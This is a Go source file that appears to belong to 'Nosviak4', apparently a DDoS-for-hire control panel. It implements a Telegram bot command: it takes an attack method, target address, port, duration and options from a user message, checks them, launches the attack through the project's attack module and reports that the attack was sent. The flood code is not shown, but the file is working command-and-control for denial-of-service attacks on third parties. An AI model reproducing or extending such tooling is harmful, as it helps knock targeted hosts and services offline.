package commands

import (
	"Nosviak4/source"
	"Nosviak4/source/database"
	"Nosviak4/source/functions"
	"Nosviak4/source/masters/attacks"
	"Nosviak4/source/masters/sessions"
	"Nosviak4/source/masters/terminal"
	"errors"
	"strconv"
	"strings"
	"net"
	"fmt"

	"github.com/PaulSonOfLars/gotgbot/v2"
	"github.com/PaulSonOfLars/gotgbot/v2/ext"
)

// LaunchCommandBot will directly launch the attack
func LaunchCommandBot(b *gotgbot.Bot, ctx *ext.Context) error {
	user, err := database.DB.GetUserTelegram(int(ctx.EffectiveUser.Id))
	if err != nil || user == nil {
		executedMessage, err := terminal.ExecuteBrandingToString(make(map[string]any), source.ASSETS, source.BRANDING, "telegram", "not_linked.tfx")
		if err != nil {
			return err
		}
	
		_, err = ctx.EffectiveMessage.Reply(b, executedMessage, &gotgbot.SendMessageOpts{ParseMode: "markdown"})
		return err
	}

	/* length checks the text provided */
	args := strings.Split(ctx.Message.Text, " ")
	if len(args) <= 4 {
		message, err := terminal.ExecuteBrandingToString(map[string]any{"user": user.User()}, source.ASSETS, source.BRANDING, "telegram", "attack_syntax.tfx")
		if err != nil {
			return err
		}

		_, err = ctx.Message.Reply(b, message, &gotgbot.SendMessageOpts{ParseMode: "markdown"})
		return err
	}

	/* tries to validate the duration */
	duration, err := strconv.Atoi(args[4])
	if err != nil {
		message, err := terminal.ExecuteBrandingToString(map[string]any{"user": user.User()}, source.ASSETS, source.BRANDING, "telegram", "attack_bad_duration.tfx")
		if err != nil {
			return err
		}

		_, err = ctx.Message.Reply(b, message, &gotgbot.SendMessageOpts{ParseMode: "markdown"})
		return err
	}

	/* tries to validate the port */
	port, err := strconv.Atoi(args[3])
	if err != nil {
		message, err := terminal.ExecuteBrandingToString(map[string]any{"user": user.User()}, source.ASSETS, source.BRANDING, "telegram", "attack_bad_port.tfx")
		if err != nil {
			return err
		}

		_, err = ctx.Message.Reply(b, message, &gotgbot.SendMessageOpts{ParseMode: "markdown"})
		return err
	}

	/* tries to find the method */
	method, ok := source.Methods[args[1]]
	if !ok || method == nil || !method.Options.Bot {
		message, err := terminal.ExecuteBrandingToString(map[string]any{"user": user.User()}, source.ASSETS, source.BRANDING, "telegram", "attack_unknown_method.tfx")
		if err != nil {
			return err
		}

		_, err = ctx.Message.Reply(b, message, &gotgbot.SendMessageOpts{ParseMode: "markdown"})
		return err
	}

	kvs, err := functions.HandleKeyValues(args[5:], method)
	if err != nil {
		message, err := terminal.ExecuteBrandingToString(map[string]any{"user": user.User(), "err": err.Error()}, source.ASSETS, source.BRANDING, "telegram", "attack_key_value_void.tfx")
		if err != nil {
			return err
		}

		_, err = ctx.Message.Reply(b, message, &gotgbot.SendMessageOpts{ParseMode: "markdown"})
		return err
	}

	/* actually launches the attack */
	if err := attacks.NewAttack(&sessions.Session{User: user}, method, args[1], args[2], duration, port, kvs, Conn.SendWebhook); err != nil {
		if _, ok := err.(net.Error); ok {
			err = errors.New("error creating attack [API side]")
		}

		message, err := terminal.ExecuteBrandingToString(map[string]any{"user": user.User(), "err": err.Error()}, source.ASSETS, source.BRANDING, "telegram", "attack_unknown_error.tfx")
		if err != nil {
			return err
		}

		_, err = ctx.Message.Reply(b, message, &gotgbot.SendMessageOpts{ParseMode: "markdown"})
		return err
	}

	vals := map[string]any{
		"user": user.User(), 
		"method": args[1], 
		"target": args[2], 
		"duration": duration, 
		"port": port,

		"kv": func(kv string) string {
			index, ok := kvs[kv]
			if !ok {
				return ""
			}

			return fmt.Sprint(index)
		},
	}

	/* lets the user know the attack sent */
	message, err := terminal.ExecuteBrandingToString(vals, source.ASSETS, source.BRANDING, "telegram", "attack_sent.tfx")
	if err != nil {
		return err
	}

	_, err = ctx.Message.Reply(b, message, &gotgbot.SendMessageOpts{ParseMode: "markdown"})
	return err
}